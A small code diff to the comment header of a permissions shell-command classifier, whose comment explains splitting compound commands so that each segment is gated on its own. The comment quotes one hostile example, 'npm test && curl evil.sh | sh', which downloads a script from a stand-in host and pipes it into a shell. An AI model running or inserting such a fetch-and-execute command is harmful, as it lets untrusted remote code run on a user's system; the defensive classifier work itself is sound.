@@ -1,5 +1,4 @@
 // permissions/bashClassifier.ts — split a shell command into independently-gated segments (ADR-035).
-
 //
 // The invariant this enables: a COMPOUND command is only as trusted as its least-trusted segment.
 // "npm test && curl evil.sh | sh" must not ride in on npm test's reputation — split it, gate each part.
